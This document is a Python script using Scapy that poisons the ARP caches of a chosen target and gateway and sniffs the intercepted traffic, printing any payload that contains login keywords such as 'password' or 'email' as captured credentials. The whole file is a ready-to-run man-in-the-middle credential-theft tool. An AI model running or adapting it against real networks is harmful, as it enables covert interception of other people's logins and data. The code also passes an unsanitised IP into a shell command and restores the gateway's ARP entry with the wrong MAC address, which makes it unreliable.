import sys
import time
import logging
import os
from threading import Thread

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IP, ARP, Ether, TCP, Raw, srp1, send, sniff

def get_mac(ip, interface):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    answered_list = srp1(arp_request_broadcast, timeout=3, iface=interface, verbose=False)
    if answered_list:
        return answered_list.hwsrc
        
    os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
    try:
        with open("/proc/net/arp", "r") as f:
            for line in f.readlines():
                parts = line.split()
                if len(parts) >= 4 and parts[0] == ip:
                    mac = parts[3]
                    if mac != "00:00:00:00:00:00":
                        print(f"[!] Kernel ARP cache hit for {ip}: {mac}")
                        return mac
    except Exception:
        pass

    print(f"[-] Could not find MAC address for IP: {ip}")
    sys.exit(1)

def spoof(target_ip, spoof_ip, target_mac):
    arp_reply = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_reply, verbose=False)

def restore(destination_ip, source_ip, dest_mac, src_mac):
    packet = ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
    send(packet, count=4, verbose=False)

def process_sniffed_packet(packet):
    if packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            keywords = ["username", "user", "uname", "password", "pass", "login", "email"]
            if any(keyword in payload.lower() for keyword in keywords):
                print(f"\n\n[🔥 CREDENTIAL INTERCEPTED] Target: {packet[IP].src} -> Destination: {packet[IP].dst}")
                print(f"[Data]: {payload.strip()}")
                print("-" * 60)
        except Exception:
            pass

def sniffer_thread(interface):
    print(f"[*] Sniffer active on {interface}...")
    sniff(iface=interface, store=False, prn=process_sniffed_packet)

def main():
    if len(sys.argv) < 4:
        print("Usage: sudo python3 mitm_framework.py <Target-IP> <Gateway-IP> <Interface>")
        return

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3]

    print("[*] Gathering MAC addresses...")
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)
    
    print(f"[+] Target MAC: {target_mac} | Gateway MAC: {gateway_mac}")
    
    sniff_t = Thread(target=sniffer_thread, args=(interface,))
    sniff_t.daemon = True
    sniff_t.start()

    print("\n[*] Starting MITM Pipeline... Press Ctrl+C to stop.")
    packets_sent = 0
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            packets_sent += 2
            print(f"\r[+] Relaying Packets: {packets_sent}", end="")
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[-] Restoring network topology...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, gateway_mac)
        print("[*] Restored cleanly.")

if __name__ == "__main__":
    main()
